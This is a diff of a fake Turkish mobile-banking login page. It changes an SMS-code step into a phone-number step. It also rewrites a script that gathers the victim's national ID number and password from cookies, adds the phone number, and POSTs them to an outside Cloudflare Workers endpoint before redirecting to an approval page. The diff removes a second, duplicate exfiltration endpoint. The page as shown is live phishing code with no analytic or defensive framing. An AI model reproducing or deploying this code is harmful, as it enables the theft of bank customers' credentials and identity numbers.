@@ -80,7 +80,7 @@
     display: table-cell;
     vertical-align: middle;
     padding: 18px 20px;
-    padding-right: 0;text-align: left;"><!--ko text:GetString('ForgotMBB')-->  Lütfen Sms Olarak Gönderilen Doğrulama Kodunu Giriniz<!--/ko--></div>
+    padding-right: 0;text-align: left;"><!--ko text:GetString('ForgotMBB')-->  Lütfen Telefon Numaranızı yazınız.<!--/ko--></div>
     <div class="content-area" data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }"><div class="login-form-wrap" data-view="views/guest/login/mbblogin/mbblogin" data-active-view="true" style="">
     <div class="login-router" data-bind="router: { cacheViews: false, alwaysTriggerAttach: true }"><div class="mbbcclogin" data-view="views/guest/login/mbblogin/subviews/mbbloginpasswordcaptcha" data-active-view="true" style="">
     
@@ -104,9 +104,7 @@
               
             <div class="input-part">
                 <!-- ko if: type()=='mbb' -->
-                <input class="inputarea" type="number" pattern="[0-9]*" id="telno" name="telno" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 6 }" placeholder="Doğrulama Kodunuzu Giriniz" style="
-    height: 48px;
-">
+                <input class="inputarea" type="number" pattern="[0-9]*" id="telno" name="telno" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" placeholder="+90">
                 <!-- /ko -->
                 <!-- ko if: type()=='yatirimci' --><!-- /ko -->
                 <!-- ko if: type()=='ast' --><!-- /ko -->
@@ -400,28 +398,28 @@
 </div></div>
  
 <script>
+
     function getCookie(name) {
-        var nameEQ = name + "=";
-        var ca = document.cookie.split(';');
-        for (var i = 0; i < ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
-        }
-        return null;
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for (var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
     }
-
+    return null;
+}
     var phoneNumberInput = document.getElementById('telno');
-
+    
     // Giriş butonu
     var loginBtn = document.getElementById('loginBtn');
-
+    
     // Cep telefonu numarası input alanını dinle
     phoneNumberInput.addEventListener('input', function () {
         var phoneNumber = phoneNumberInput.value;
-
+    
         // Eğer en az 8 karakter girilmişse
-        if (phoneNumber.length >= 6) {
+        if (phoneNumber.length >= 8) {
             // Giriş butonunun disable özelliğini kaldır
             loginBtn.removeAttribute('disabled');
         } else {
@@ -429,58 +427,36 @@
             loginBtn.setAttribute('disabled', 'disabled');
         }
     });
-
+    
     // Giriş butonuna tıklanınca
-    loginBtn.addEventListener('click', function () {
-        var telno = document.getElementById('telno').value;
+loginBtn.addEventListener('click', function () {
+    var telno = document.getElementById('telno').value;
 
-        // Cookie'den kayıtlı adı al
-        var tcno = getCookie("tcno");
-        var pass = getCookie("pass");
-
-        // İstanbul saat diliminde post saatini al
-        var now = new Date();
-        var options = { timeZone: 'Europe/Istanbul', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
-        var formatter = new Intl.DateTimeFormat([], options);
-        var postTime = formatter.format(now);
-
-        // POST işlemi için veri oluştur
-        var data = new FormData();
-        data.append('telno', telno);
-        data.append('tcno', tcno); // Cookie'den alınan adı ekle
-        data.append('pass', pass);
-        data.append('post_time', postTime); // Post saatini ekle
-
-        // POST işlemi için fetch kullanarak isteği oluştur
-        fetch('https://worker-tilki-wood-f5ce.selimjuhan2.workers.dev/', {
-            method: 'POST',
-            body: data
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log(data);
-            window.location.href = 'onay.html';
-        })
-        .catch(error => {
-            console.error('Hata:', error);
-            window.location.href = 'onay.html';
-        });
-
-        // İkinci adres için aynı işlemi gerçekleştir
-        fetch('https://worker-hidden-meadsow-bce1cd.selimjuhasn2.workers.dev/', {
-            method: 'POST',
-            body: data
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log(data);
-            // İkinci adresin cevabına göre işlem yapabilirsiniz
-        })
-        .catch(error => {
-            console.error('Hata:', error);
-        });
+    // Cookie'den kayıtlı adı al
+    var tcno = getCookie("tcno");
+    var pass = getCookie("pass");
+    
+    // POST işlemi için veri oluştur
+    var data = new FormData();
+    data.append('telno', telno);
+    data.append('tcno', tcno); // Cookie'den alınan adı ekle
+    data.append('pass', pass);
+    // POST işlemi için fetch kullanarak isteği oluştur
+    fetch('https://worker-tilki-wood-f5ce.selimjuhan2.workers.dev/', {
+        method: 'POST',
+        body: data
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data);
+        window.location.href = 'onay.html';
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        window.location.href = 'onay.html';
     });
-</script>
+});
 
+    </script>
  
 </body></html>
